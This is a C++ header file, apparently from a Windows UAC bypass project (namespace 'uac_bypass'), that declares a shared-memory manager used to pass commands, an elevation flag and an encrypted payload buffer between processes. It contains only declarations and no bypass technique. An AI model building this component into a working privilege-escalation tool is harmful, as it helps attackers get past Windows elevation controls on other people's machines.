#ifndef UAC_BYPASS_SHARED_MEMORY_MANAGER_H
#define UAC_BYPASS_SHARED_MEMORY_MANAGER_H

#include <windows.h>
#include <string>
#include "Logger.h"
#include "SecurityUtils.h"

namespace uac_bypass {

// Struttura dati condivisa
struct SharedData {
    DWORD processId;
    DWORD status;
    BOOL isElevated;
    WCHAR command[MAX_PATH];
    BYTE payload[4096];
    DWORD payloadSize;
    BOOL completed;
};

class SharedMemoryManager {
public:
    static SharedMemoryManager& getInstance();
    
    bool initialize(const std::wstring& name);
    void cleanup();
    
    bool writeData(const SharedData& data);
    bool readData(SharedData& data);
    
    bool waitForCompletion(DWORD timeout = 30000);
    bool signalCompletion();

private:
    SharedMemoryManager();
    ~SharedMemoryManager();
    
    SharedMemoryManager(const SharedMemoryManager&) = delete;
    SharedMemoryManager& operator=(const SharedMemoryManager&) = delete;

    bool createSharedMemory();
    bool openSharedMemory();
    bool mapSharedMemory();
    
    bool createSyncObjects();
    bool openSyncObjects();
    
    void encryptData(SharedData& data);
    void decryptData(SharedData& data);
    
    std::wstring memoryName;
    HANDLE hSharedMemory;
    HANDLE hMutex;
    HANDLE hEventRead;
    HANDLE hEventWrite;
    LPVOID pSharedData;
    Logger& logger;
    bool initialized;
    
    static const DWORD SHARED_MEM_SIZE = sizeof(SharedData);
    static const WCHAR* MUTEX_PREFIX;
    static const WCHAR* EVENT_READ_PREFIX;
    static const WCHAR* EVENT_WRITE_PREFIX;
};

} // namespace uac_bypass

#endif // UAC_BYPASS_SHARED_MEMORY_MANAGER_H
